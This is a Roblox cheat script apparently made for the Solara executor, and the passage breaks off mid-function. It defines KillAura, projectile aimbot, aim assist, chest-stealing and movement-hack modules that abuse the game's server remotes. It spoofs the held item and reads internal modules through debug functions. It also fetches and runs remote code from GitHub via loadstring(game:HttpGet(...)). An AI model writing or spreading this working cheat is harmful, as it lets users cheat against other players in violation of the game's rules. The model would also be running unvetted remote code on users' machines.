---cocosploit solara v4.5 test

Players = game:GetService("Players")
Lighting = game:GetService("Lighting")
UserInputService = game:GetService("UserInputService")
LocalPlayer = Players.LocalPlayer
Character = LocalPlayer.Character
Humanoid = Character.Humanoid
PrimaryPart = Character.PrimaryPart
PlayerGui = LocalPlayer.PlayerGui
PlayerScripts = LocalPlayer.PlayerScripts
Camera = workspace.Camera
CurrentCamera = workspace.CurrentCamera
RunService = game["Run Service"]
TweenService = game.TweenService



local ReplicatedStorage = game:GetService("ReplicatedStorage")

local GuiLibrary = {Version = "1.0.3",CustomEdition = "",WindowCount = 0, API = {Windows = {},buttons = {}}}
local utilityToggles = {}
local entity = {gui = game.Players.LocalPlayer.PlayerGui,HumanoidRootPart=function() return game.Players.LocalPlayer.Character.PrimaryPart end}
local protectInstance = function(v) v.Name = math.random() end
local gui = Instance.new("ScreenGui",entity.gui)
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
protectInstance(gui)

local canSave = true


shared.AutumnLoaded = false

local player = game.Players.LocalPlayer

-- Function to handle sending the player up
local function sendPlayerUp()
    local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        local jumpVelocity = Vector3.new(0, 250, 0)  -- Adjust the Y component as needed for desired jump height
        humanoid.RootPart.Velocity = jumpVelocity
    end
end


local config = {
	["Buttons"] = {},
	["Toggles"] = {},
	["Pickers"] = {}
}

local configPath = "CocoSploit_Solara/Configs/"..game.PlaceId..".json"
makefolder("CocoSploit_Solara")
makefolder("CocoSploit_Solara/Configs")
local function saveConfig()
	if canSave then
		if isfile(configPath) then
			delfile(configPath)
		end
		writefile(configPath,game.HttpService:JSONEncode(config))
	end
end

local function loadConfig()
	config = (game.HttpService:JSONDecode(readfile(configPath)))
end

if not isfile(configPath) then
	saveConfig()
	task.wait(1)
end

loadConfig()

task.wait(1)

local notificationFrame = Instance.new("Frame",gui)
notificationFrame.Size = UDim2.fromScale()

local Notifications = {}
function GuiLibrary.CreateNotification(title,text,time)

end

local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()


function CreateNotification(Title, Duration, Message)
    Notification:Notify(
        {Title = Title, Description = Message},
        {OutlineColor = Color3.fromRGB(80, 80, 80), Time = Duration, Type = "image"},
        {Image = "http://www.roblox.com/asset/?id=6023426923", ImageColor = Color3.fromRGB(255, 84, 84)}
    )
end

function CreateNotificationStaffDetector(Title, Duration, Message)
    sound = Instance.new("Sound",workspace)
    sound.Name = "Noooooooooooooooot noooooooooooooooooooooooot"
    sound.SoundId = "rbxassetid://7396762708"
    sound:Play()

    Notification:Notify(
        {Title = Title, Description = Message},
        {OutlineColor = Color3.fromRGB(255, 0, 0), Time = Duration, Type = "image"},
        {Image = "http://www.roblox.com/asset/?id=6031071053", ImageColor = Color3.fromRGB(255, 84, 84)}
    )
end

local notificationFrame = Instance.new("Frame",gui)
notificationFrame.Size = UDim2.fromScale()

local Notifications = {}
function GuiLibrary.CreateNotification(title,text,time)

end


-- Existing code for creating the GUI window

function GuiLibrary.CreateWindow(name)
    local top = Instance.new("TextLabel", gui)
    local UICorner = Instance.new("UICorner")
    GuiLibrary.WindowCount += 1
    top.Position = UDim2.fromScale(0.02 + (0.12 * GuiLibrary.WindowCount), 0.07)
    top.Size = UDim2.fromScale(0.1, 0.045)
    top.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
    top.BorderSizePixel = 0
    top.TextColor3 = Color3.fromRGB(0, 255, 0) -- 改为绿色
    top.TextXAlignment = Enum.TextXAlignment.Left
    top.TextSize = 12
    top.Text = "  " .. name
    top.Font = Enum.Font.Gotham

    UICorner.CornerRadius = UDim.new(0, 10)
    UICorner.Parent = top

    -- Function to toggle the visibility of all windows
    local function toggleAllWindows()
        for _, window in pairs(GuiLibrary.API.Windows) do
            window.top.Visible = not window.top.Visible
        end
    end

    -- Existing InputBegan connection to toggle UI with RightShift key
    game.UserInputService.InputBegan:Connect(function(key, gpe)
        if gpe then return end
        if key.KeyCode == Enum.KeyCode.RightShift then
            toggleAllWindows()
        end
    end)

    -- New button to toggle the visibility of all windows
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = game.CoreGui

    local CocokiwiButton = Instance.new("TextButton")
    CocokiwiButton.Name = "CocokiwiButton"
    CocokiwiButton.Parent = ScreenGui
    CocokiwiButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    CocokiwiButton.BackgroundTransparency = 0.5
    CocokiwiButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    CocokiwiButton.BorderSizePixel = 0
    CocokiwiButton.Position = UDim2.new(0.95, 0, 0.3, 0)
    CocokiwiButton.Size = UDim2.new(0, 35, 0, 35)
    CocokiwiButton.Font = Enum.Font.SourceSans
    CocokiwiButton.Text = ""
    CocokiwiButton.TextColor3 = Color3.fromRGB(0, 0, 0)
    CocokiwiButton.TextSize = 14.0

    local ButtonLogo = Instance.new("ImageLabel")
    ButtonLogo.Name = "ButtonLogo"
    ButtonLogo.Parent = CocokiwiButton
    ButtonLogo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ButtonLogo.BackgroundTransparency = 1.0
    ButtonLogo.BorderColor3 = Color3.fromRGB(0, 0, 0)
    ButtonLogo.BorderSizePixel = 0
    ButtonLogo.Position = UDim2.new(0.1, 0, 0.1, 0)
    ButtonLogo.Size = UDim2.new(0.8, 0, 0.8, 0)
    ButtonLogo.Image = "rbxassetid://14483298187"

    CocokiwiButton.MouseButton1Down:Connect(toggleAllWindows)

    local moduleFrame = Instance.new("Frame", top)
    moduleFrame.BackgroundTransparency = 1
    moduleFrame.Size = UDim2.fromScale(1, 20)
    moduleFrame.Position = UDim2.fromScale(0, 1)
    local moduleSorter = Instance.new("UIListLayout", moduleFrame)
    moduleSorter.SortOrder = Enum.SortOrder.LayoutOrder
    GuiLibrary.API.buttons[name] = {}
    moduleFrame.ChildAdded:Connect(function(v)
        if not v:IsA("TextButton") then return end
        v.LayoutOrder = #moduleFrame:GetChildren()
    end)

    GuiLibrary.API.Windows[name] = {
        top = top,  -- Store top label for visibility control
        CreateButton = function(tab)
            if config.Buttons[tab["Name"]] == nil then
                config.Buttons[tab["Name"]] = {Enabled = false, Keybind = "Unknown"}
            end

            local button = Instance.new("TextButton", moduleFrame)
            button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
            button.Size = UDim2.fromScale(1, 0.045)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.TextXAlignment = Enum.TextXAlignment.Left
            button.Text = "  " .. tab["Name"]
            button.TextSize = 12
            button.Font = Enum.Font.Gotham
            button.BorderSizePixel = 0
            table.insert(GuiLibrary.API.buttons[name], button)

            local dropdownFrame = Instance.new("Frame", moduleFrame)
            dropdownFrame.Size = UDim2.fromScale(1, 1)
            dropdownFrame.BackgroundTransparency = 1
            dropdownFrame.Visible = false
            dropdownFrame.LayoutOrder = 900000000
            local dropdownFrameSorter = Instance.new("UIListLayout", dropdownFrame)

            local keybindButton = Instance.new("TextButton", dropdownFrame)
            keybindButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
            keybindButton.Size = UDim2.fromScale(1, 0.045)
            keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            keybindButton.TextXAlignment = Enum.TextXAlignment.Left
            keybindButton.Text = "  Keybind : "
            keybindButton.TextSize = 12
            keybindButton.Font = Enum.Font.Gotham
            keybindButton.BorderSizePixel = 0

            local keybind = Enum.KeyCode[tostring(config.Buttons[tab["Name"]].Keybind)]
            if keybind ~= Enum.KeyCode.Unknown then
                keybindButton.Text = "  Keybind : " .. tostring(config.Buttons[tab["Name"]].Keybind)
            end

            local keybindConnection
            keybindButton.MouseButton1Down:Connect(function()
                keybindConnection = game.UserInputService.InputBegan:Connect(function(key, gpe)
                    if gpe then return end
                    keybindButton.Text = "  Keybind : " .. tostring(key.KeyCode):split(".")[3]
                    config.Buttons[tab["Name"]].Keybind = tostring(key.KeyCode):split(".")[3]
                    task.wait(0.06)
                    saveConfig()
                    keybind = key.KeyCode
                    keybindConnection:Disconnect()
                end)
            end)

            local btn
            btn = {
                Enabled = false,
                ToggleButton = function(t)
                    tab["Function"](t)
                    btn.Enabled = t
                    button.TextColor3 = (t and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)) -- 改为绿色
                    arraylist(t, tab["Name"], tab["Extratext"])
                    config.Buttons[tab["Name"]].Enabled = t
                    task.wait(0.005)
                    saveConfig()
                end,
                CreateToggle = function(tab2)
                    if config.Toggles[tab2["Name"] .. tab["Name"]] == nil then
                        config.Toggles[tab2["Name"] .. tab["Name"]] = {Enabled = false}
                    end

                    local button = Instance.new("TextButton", dropdownFrame)
                    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
                    button.Size = UDim2.fromScale(1, 0.045)
                    button.TextColor3 = Color3.fromRGB(255, 255, 255)
                    button.TextXAlignment = Enum.TextXAlignment.Left
                    button.Text = "  " .. tab2["Name"]
                    button.TextSize = 12
                    button.Font = Enum.Font.Gotham
                    button.BorderSizePixel = 0
                    local state = {Enabled = false}
                    button.MouseButton1Down:Connect(function()
                        state.Enabled = not state.Enabled
                        button.TextColor3 = (state.Enabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)) -- 改为绿色
                        if tab2["Function"] then
                            tab2["Function"](state.Enabled)
                        end
                        config.Toggles[tab2["Name"] .. tab["Name"]].Enabled = state.Enabled
                        task.wait(0.06)
                        saveConfig()
                    end)
                    task.spawn(function()
                        if config.Toggles[tab2["Name"] .. tab["Name"]].Enabled then
                            repeat task.wait() until shared.AutumnLoaded == true
                            state.Enabled = true
                            button.TextColor3 = (state.Enabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)) -- 改为绿色
                            if tab2["Function"] then
                                tab2["Function"](state.Enabled)
                            end
                        end
                    end)
                    return state
                end,
                CreatePicker = function(tab2)
                    if config.Pickers[tab2["Name"] .. tab["Name"]] == nil then
                        config.Pickers[tab2["Name"] .. tab["Name"]] = {Value = tab2["Options"][1]}
                    end

                    local button = Instance.new("TextButton", dropdownFrame)
                    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
                    button.Size = UDim2.fromScale(1, 0.045)
                    button.TextColor3 = Color3.fromRGB(255, 255, 255)
                    button.TextXAlignment = Enum.TextXAlignment.Left
                    button.Text = "  " .. tab2["Name"] .. ": " .. tab2["Options"][1]
                    button.TextSize = 12
                    button.Font = Enum.Font.Gotham
                    button.BorderSizePixel = 0
                    local state = {Value = tab2["Options"][1]}
                    local index = 1
                    button.MouseButton1Down:Connect(function()
                        index = (index + 1)
                        if index > #tab2["Options"] then
                            index = 1
                        end
                        if tab2["Function"] then
                            tab2["Function"](tab2["Options"][index])
                        end
                        button.Text = "  " .. tab2["Name"] .. " : " .. tab2["Options"][index]
                        state.Value = tab2["Options"][index]
                        config.Pickers[tab2["Name"] .. tab["Name"]].Value = tab2["Options"][index]
                        task.wait(0.06)
                        saveConfig()
                    end)
                    task.spawn(function()
                        repeat
                            task.wait()
                            index = (index + 1)
                            if index > #tab2["Options"] then
                                index = 1
                            end
                            if tab2["Function"] then
                                tab2["Function"](tab2["Options"][index])
                            end
                            button.Text = "  " .. tab2["Name"] .. " : " .. tab2["Options"][index]
                            state.Value = tab2["Options"][index]
                        until state.Value == config.Pickers[tab2["Name"] .. tab["Name"]].Value
                    end)
                    return state
                end,
            }

            utilityToggles[tab["Name"]] = function(t)
                btn.ToggleButton(t)
            end

            button.MouseButton1Down:Connect(function()
                btn.ToggleButton(not btn.Enabled)
            end)

            if config.Buttons[tab["Name"]].Enabled then
                task.spawn(function()
                    repeat task.wait() until shared.AutumnLoaded == true
                    btn.ToggleButton(true)
                end)
            end

            game.UserInputService.InputBegan:Connect(function(key, gpe)
                if gpe or not canSave then return end
                if key.KeyCode == Enum.KeyCode.Unknown then return end
                if key.KeyCode == keybind then
                    btn.ToggleButton(not btn.Enabled)
                end
            end)

            button.MouseButton2Down:Connect(function()
                dropdownFrame.Visible = not dropdownFrame.Visible
                for i, v in pairs(GuiLibrary.API.buttons[name]) do
                    v.Visible = not dropdownFrame.Visible
                end
                button.Visible = true
            end)

            return btn
        end,
    }
end


GuiLibrary.CreateWindow("Combat")
GuiLibrary.CreateWindow("Blatant")
GuiLibrary.CreateWindow("Utility")
GuiLibrary.CreateWindow("World")
GuiLibrary.CreateWindow("Gui")

local spawnConnections = {}

local lplr = game.Players.LocalPlayer
local inventory = workspace[lplr.Name].InventoryFolder.Value

lplr.CharacterAdded:Connect(function(char)
	repeat task.wait() until char ~= nil
	for i,v in next, spawnConnections do
		task.spawn(function() v(char) end)
	end
end)

table.insert(spawnConnections,function(char)
	task.wait(1)
	inventory = workspace[lplr.Name].InventoryFolder.Value
end)

local weaponMeta = {
	{"rageblade", 100},
	{"emerald_sword", 99},
	{"deathbloom", 99},
	{"glitch_void_sword", 98},
	{"sky_scythe", 98},
	{"diamond_sword", 97}, 
	{"iron_sword", 96},
	{"stone_sword", 95},
	{"wood_sword", 94},
	{"emerald_dao", 93},
	{"diamond_dao", 99},
	{"diamond_dagger", 99},
	{"diamond_great_hammer", 99},
	{"diamond_scythe", 99},
	{"iron_dao", 97},
	{"iron_scythe", 97},
	{"iron_dagger", 97},
	{"iron_great_hammer", 97},
	{"stone_dao", 96},
	{"stone_dagger", 96},
	{"stone_great_hammer", 96},
	{"stone_scythe", 96},
	{"wood_dao", 95},
	{"wood_scythe", 95},
	{"wood_great_hammer", 95},
	{"wood_dagger", 95},
	{"frosty_hammer", 1},
}

local function hasItem(item)
	if inventory:FindFirstChild(item) then
		return true, 1
	end
	return false
end

local function getBestWeapon()
	local bestSword
	local bestSwordMeta = 0
	for i, sword in ipairs(weaponMeta) do
		local name = sword[1]
		local meta = sword[2]
		if meta > bestSwordMeta and hasItem(name) then
			bestSword = name
			bestSwordMeta = meta
		end
	end
	return inventory:FindFirstChild(bestSword)
end

local function newChat(msg)
    local args = {
        [1] = msg,
        [2] = "All"
    }
    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
end

local function getNearestPlayer(range)
	local nearest
	local nearestDist = 9e9
	for i,v in pairs(game.Players:GetPlayers()) do
		pcall(function()
			if v == lplr or v.Team == lplr.Team then return end
			if v.Character.Humanoid.Health > 0 and (v.Character.PrimaryPart.Position - lplr.Character.PrimaryPart.Position).Magnitude < nearestDist and (v.Character.PrimaryPart.Position - lplr.Character.PrimaryPart.Position).Magnitude <= range then
				nearest = v
				nearestDist = (v.Character.PrimaryPart.Position - lplr.Character.PrimaryPart.Position).Magnitude
			end
		end)
	end
	return nearest
end

local CIRCLE_RADIUS = 12
local CIRCLE_THICKNESS = 0.2
local CIRCLE_COLOR = BrickColor.new("Bright red")
local NUM_SEGMENTS = 64

local circleParts = {}

local function createNeonPart(parent, angle, radius, thickness, color)
    local part = Instance.new("Part")
    part.Size = Vector3.new(thickness, thickness, thickness)
    part.Anchored = true
    part.CanCollide = false
    part.BrickColor = color
    part.Material = Enum.Material.Neon
    part.Transparency = 0.5
    part.Position = parent.Position + Vector3.new(math.cos(angle) * radius, 0.5, math.sin(angle) * radius)
    part.Parent = parent
    return part
end

local function updatePosition(character)
    if character then
        local rootPosition = character.HumanoidRootPart.Position
        for i, part in ipairs(circleParts) do
            local angle = math.rad((360 / NUM_SEGMENTS) * (i - 1))
            part.Position = rootPosition + Vector3.new(math.cos(angle) * CIRCLE_RADIUS, 0.5, math.sin(angle) * CIRCLE_RADIUS)
        end
    end
end

local function createCircle(character)
    if not character then return end
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end
    for i = 1, NUM_SEGMENTS do
        local angle = math.rad((360 / NUM_SEGMENTS) * (i - 1))
        local part = createNeonPart(humanoidRootPart, angle, CIRCLE_RADIUS, CIRCLE_THICKNESS, CIRCLE_COLOR)
        table.insert(circleParts, part)
    end
    updatePosition(character)
    game:GetService("RunService").RenderStepped:Connect(function()
        updatePosition(character)
    end)
end

local function deleteCircle()
    for _, part in ipairs(circleParts) do
        part:Destroy()
    end
    circleParts = {}
end

local player = game.Players.LocalPlayer

local function getRemote(name)
	local remote
	for i,v in pairs(game:GetDescendants()) do
		if v.Name == name then
			remote = v
			break
		end
	end
	return remote
end

local SetInvItem = getRemote("SetInvItem")
local function spoofHand(item)
	if hasItem(item) then
		SetInvItem:InvokeServer({
			["hand"] = inventory:WaitForChild(item)
		})
	end
end

local knitRecieved, knit
knitRecieved, knit = pcall(function()
	repeat task.wait()
		return debug.getupvalue(require(game:GetService("Players")[lplr.Name].PlayerScripts.TS.knit).setup, 6)
	until knitRecieved
end)

local function getController(name)
	return knit.Controllers[name]
end

MainTargets = {}

local auraAnimations = {
	["FAST!!!"] = {
		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(220), math.rad(100), math.rad(100)),Timer = 0.1},
        {CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(220), math.rad(100), math.rad(100)),Timer = 0.1},
        {CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(220), math.rad(100), math.rad(100)),Timer = 0.1},
	},
}

local AuraRemote = getRemote("SwordHit")

local viewmodel = workspace.Camera.Viewmodel.RightHand.RightWrist
local weld = viewmodel.C0
local oldweld = viewmodel.C0

local TweenService = game.TweenService

table.insert(spawnConnections,function(char)
	task.wait(1)
	viewmodel = workspace.Camera.Viewmodel.RightHand.RightWrist
end)

local animRunning = true
local reverseTween
Aura = GuiLibrary.API.Windows.Combat.CreateButton({
    ["Name"] = "KillAura",
    ["Function"] = function(callback)
        if callback then
            task.spawn(function()
                CreateNotification("KillAura", 1.2, "KillAura has been enabled")
                repeat task.wait()
                    if getNearestPlayer(25) ~= nil then
                        pcall(function()
                            local animation = auraAnimations["FAST!!!"]
                            local allTime = 0
                            task.spawn(function()
                                if CustomAnimation.Enabled then
                                    animRunning = true
                                    for i, v in pairs(animation) do allTime += v.Timer end
                                    for i, v in pairs(animation) do
                                        local tween = game.TweenService:Create(viewmodel, TweenInfo.new(v.Timer), {C0 = oldweld * v.CFrame})
                                        tween:Play()
                                        task.wait(v.Timer + 0.01)
                                    end
                                    animRunning = false
                                    game.TweenService:Create(viewmodel, TweenInfo.new(1), {C0 = oldweld}):Play()
                                end
                            end)
                            task.wait(allTime)
                        end)
                    end
                until (not Aura.Enabled)
                CreateNotification("KillAura", 1.2, "KillAura has been disabled")
            end)

            task.spawn(function()
                repeat task.wait()
                    if AuraRotations.Enabled then
                        local entity = getNearestPlayer(25)
                        if entity then
                            lplr.Character.PrimaryPart.CFrame = CFrame.lookAt(lplr.Character.PrimaryPart.Position, Vector3.new(entity.Character.PrimaryPart.Position.X, lplr.Character.PrimaryPart.Position.Y, entity.Character.PrimaryPart.Position.Z))
                        end
                    end
                until (not Aura.Enabled)
            end)

            task.spawn(function()
                repeat task.wait()
                    pcall(function()
                        local entity = getNearestPlayer(25)
                        local weapon = getBestWeapon()
                        if entity == nil then return end
                        spoofHand(getBestWeapon().Name)
                        
                        AuraRemote:FireServer({
                            ["chargedAttack"] = {
                                ["chargeRatio"] = (getBestWeapon().Name:lower():find("hammer") and 0.2 or 0.8)
                            },
                            ["entityInstance"] = entity.Character,
                            ["validate"] = {
                                ["targetPosition"] = {
                                    ["value"] = entity.Character.PrimaryPart.Position
                                },
                                ["selfPosition"] = {
                                    ["value"] = lplr.Character.PrimaryPart.Position
                                }
                            },
                            ["weapon"] = weapon
                        })
                    end)
                until (not Aura.Enabled)
            end)

             if RangeVisualizer.Enabled then
                  createCircle(lplr.character)
              else
                  deleteCircle()
                
             end

        else
            deleteCircle()
             end
        end
})

local animAuraTab = {}
for i, v in pairs(auraAnimations) do table.insert(animAuraTab, i) end

CustomAnimation = Aura.CreateToggle({
    ["Name"] = "Custom Animation",
    ["Function"] = function() end,
})

AuraRotations = Aura.CreateToggle({
    ["Name"] = "Locked View",
    ["Function"] = function() end,
})

RangeVisualizer = Aura.CreateToggle({
    ["Name"] = "Range Visualizer",
    ["Function"] = function(enabled)
        if not enabled then
            deleteCircle()
        end
    end,
})

local ProjectileFire = getRemote("ProjectileFire")

local function shoot(bow, pos)
	local args = {}
	if bow.Name:find("bow") then
		args = {
			[1] = bow,
			[2] = "arrow",
			[3] = "arrow",
			[4] = pos,
			[5] = pos + Vector3.new(0,2,0),
			[6] = Vector3.new(0,-5,0),
			[7] = tostring(game:GetService("HttpService"):GenerateGUID(true)),
			[8] = {
				["drawDurationSeconds"] = 1,
				["shotId"] = tostring(game:GetService("HttpService"):GenerateGUID(false))
			},
			[9] =  workspace:GetServerTimeNow() - 0.045
		}
	else
		args = {
			[1] = bow,
			[2] = bow.Name,
			[3] = bow.Name,
			[4] = pos,
			[5] = pos + Vector3.new(0,2,0),
			[6] = Vector3.new(0,-5,0),
			[7] = tostring(game:GetService("HttpService"):GenerateGUID(true)),
			[8] = {
				["drawDurationSeconds"] = 1,
				["shotId"] = tostring(game:GetService("HttpService"):GenerateGUID(false))
			},
			[9] =  workspace:GetServerTimeNow() - 0.045
		}
	end
	
	ProjectileFire:InvokeServer(unpack(args))
end

local function getAllBows()
	local bows = {}
	for i,v in pairs(inventory:GetChildren()) do
		if v.Name:find("bow") or v.Name:find("fireball") or v.Name:find("snowball") or v.Name:find("lasso") then
			table.insert(bows,v)
		end
	end
	return bows
end

ProjectileAimbot2 = GuiLibrary.API.Windows.Combat.CreateButton({
	["Name"] = "ProjectileAimbot",
	["Function"] = function(callback)
		if callback then
			CreateNotification("ProjectileAimbot", 1.2, "ProjectileAimbot has been enabled")
			task.spawn(function()
				repeat task.wait()
					local target = getNearestPlayer(9e9)
					if target then
						local bows = getAllBows()
						for i,v in pairs(bows) do
							spoofHand(v.Name)
							task.wait(.06)
							if v.Name == "fireball" or v.Name == "snowball" or v.Name == "lasso" then
								if not AllProjectiles.Enabled then continue end
							end
							shoot(v,target.Character.PrimaryPart.Position)
						end
					end
				until (not ProjectileAimbot2.Enabled)
				CreateNotification("ProjectileAimbot", 1.2, "ProjectileAimbot has been disabled")
			end)
		else

		end
	end,
})

AllProjectiles = ProjectileAimbot2.CreateToggle({
	["Name"] = "All Projectiles",
	["Function"] = function() end
})

ProjectileAura = GuiLibrary.API.Windows.Combat.CreateButton({
	["Name"] = "ProjectileAura",
	["Function"] = function(callback)
		if callback then
			CreateNotification("ProjectileAura", 1.2, "ProjectileAura has been enabled")
			task.spawn(function()
				repeat task.wait()
					local target = getNearestPlayer(25)
					if target then
						local bows = getAllBows()
						for i,v in pairs(bows) do
							spoofHand(v.Name)
							task.wait(.06)
							if v.Name == "fireball" or v.Name == "snowball" or v.Name == "lasso" then
								if not AllProjectiles.Enabled then continue end
							end
							shoot(v,target.Character.PrimaryPart.Position)
						end
					end
				until (not ProjectileAura.Enabled)
				CreateNotification("ProjectileAura", 1.2, "ProjectileAura has been disabled")
			end)
		else

		end
	end,
})

AllProjectiles = ProjectileAura.CreateToggle({
	["Name"] = "All Projectiles",
	["Function"] = function() end
})

AimAssist = GuiLibrary.API.Windows.Combat.CreateButton({
    ["Name"] = "AimAssist",
    ["Function"] = function(callback)
        if callback then
            task.spawn(function()
                CreateNotification("AimAssist", 1.2, "AimAssist has been enabled")
                repeat task.wait(0)
                    local Entity = getPlayer(25)
                    if Entity then
                        setCameraToPlayer(Entity)
                    end
                until (not AimAssist.Enabled)
                CreateNotification("AimAssist", 1.2, "AimAssist has been disabled")
            end)
        end
    end,
})

function getPlayer(maxDistance)
    local player = game.Players.LocalPlayer
    local nearestPlayer = nil
    local shortestDistance = maxDistance

    for _, target in pairs(game.Players:GetPlayers()) do
        if target ~= player and target.Team ~= player.Team and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (target.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
            -- Check if the player's health is greater than 0.1
            if target.Character.Humanoid.Health > 0.1 then
                if distance < shortestDistance then
                    nearestPlayer = target
                    shortestDistance = distance
                end
            end
        end
    end

    return nearestPlayer
end

function setCameraToPlayer(target)
    local player = game.Players.LocalPlayer
    local camera = game.Workspace.CurrentCamera
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        local targetPosition = target.Character.HumanoidRootPart.Position
        camera.CFrame = CFrame.new(camera.CFrame.Position, targetPosition)
    end
end


local chests = {}
for i,v in pairs(workspace:GetChildren()) do
	if v.Name == "chest" then
		table.insert(chests,v)
	end
end
local chests = {}
for i,v in pairs(workspace:GetChildren()) do
	if v.Name == "chest" then
		table.insert(chests,v)
	end
end
Stealer = GuiLibrary.API.Windows.Blatant.CreateButton({
	["Name"] = "ChestStealer",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				CreateNotification("ChestStealer", 1.2, "ChestStealer has been enabled")
				repeat task.wait()
					task.wait(0.15)
					task.spawn(function()
						for i, v in pairs(chests) do
							local Magnitude = (v.Position - PrimaryPart.Position).Magnitude
							if Magnitude <= 30 then
								for _, item in pairs(v.ChestFolderValue.Value:GetChildren()) do
									if item:IsA("Accessory") then
										task.wait()
										game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):FindFirstChild("@rbxts").net.out._NetManaged:FindFirstChild("Inventory/ChestGetItem"):InvokeServer(v.ChestFolderValue.Value, item)
									end
								end
							end
						end
					end)
				until (not Stealer.Enabled)
				CreateNotification("ChestStealer", 1.2, "ChestStealer has been disabled")
			end)
		end
	end,
})

local function getfireball()
	local bows = {}
	for i,v in pairs(inventory:GetChildren()) do
		if v.Name:find("fireball") then
			table.insert(bows,v)
		end
	end
	return bows
end

local ballSpeed = false
local fireball = true
FireballSpeed = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "FireballSpeed",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("FireballSpeed", 1.2, "FireballSpeed has been enabled")
            task.spawn(function()
                repeat task.wait()
                    local target = game.Players.LocalPlayer  -- Reference to the player's own character
                    if target and target.Character and target.Character.PrimaryPart then
                        local bows = getfireball()
                        for i, v in pairs(bows) do
                            spoofHand(v.Name)
                            task.wait(0.1)
                            if v.Name == "fireball" then
                                if not fireball then continue end
                            end
                            shoot(v, target.Character.PrimaryPart.Position)
                            task.wait(0.52)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
							task.wait(0.1)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 34
                            task.wait(0.1)

                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 22
                        end
                    end
                until (not ballSpeed)
                CreateNotification("FireballSpeed", 1.2, "FireballSpeed has been disabled")
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 22
            end)
        else

        end
    end,
})

local fireball = true
FireballTP = GuiLibrary.API.Windows.Blatant.CreateButton({
    ["Name"] = "FireballLongJump",
    ["Function"] = function(callback)
        if callback then
            CreateNotification("FireballLongJump", 1.2, "FireballLongJump has been enabled")
            task.spawn(function()
                repeat task.wait()
                    local target = game.Players.LocalPlayer  -- Reference to the player's own character
                    if target and target.Character and target.Character.PrimaryPart then
                        local bows = getfireball()
                        for i, v in pairs(bows) do
                            spoofHand(v.Name)
                            task.wait(.06)
                            if v.Name == "fireball" then
                                if not fireball then continue end
                            end
                            shoot(v, target.Character.PrimaryPart.Position)
                            Wait(0.5)
                            local TweenService = game:GetService("TweenService")
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

local goal = rootPart.CFrame * CFrame.new(0, 10, -77)  -- Move 25 studs forward

local tweenInfo = TweenInfo.new(0.9, Enum.EasingStyle.Linear)  -- 1 second duration, linear easing
local tween = TweenService:Create(rootPart, tweenInfo, {CFrame = goal})

tween:Play()

                            Wait(0.85)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 13
							Wait(0.2)
                            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 23
                        end
                    end
                until (not ballSpeed)
                CreateNotification("FireballLongJump", 1.2, "FireballLongJump has been disabled")
            end)
        else

        end
    end,
})


local function Buystonesword()
    local args = {
        [1] = {
            ["shopItem"] = {
                ["ignoredByKit"] = {
                    [1] = "barbarian",
                    [2] = "dasher",
                    [3] = "frost_hammer_kit",
                    [4] = "tinker"
                },
                ["itemType"] = "stone_sword",
                ["price"] = 70,
                ["superiorItems"] = {
                    [1] = "iron_sword",
                },
                ["currency"] = "iron",
                ["amount"] = 1,
                ["lockAfterPurchase"] = true,
                ["category"] = "Combat",
                ["disabledInQueue"] = {
                    [1] = "tnt_wars"
                }
            },
            ["shopId"] = "1_item_shop"
        }
    }
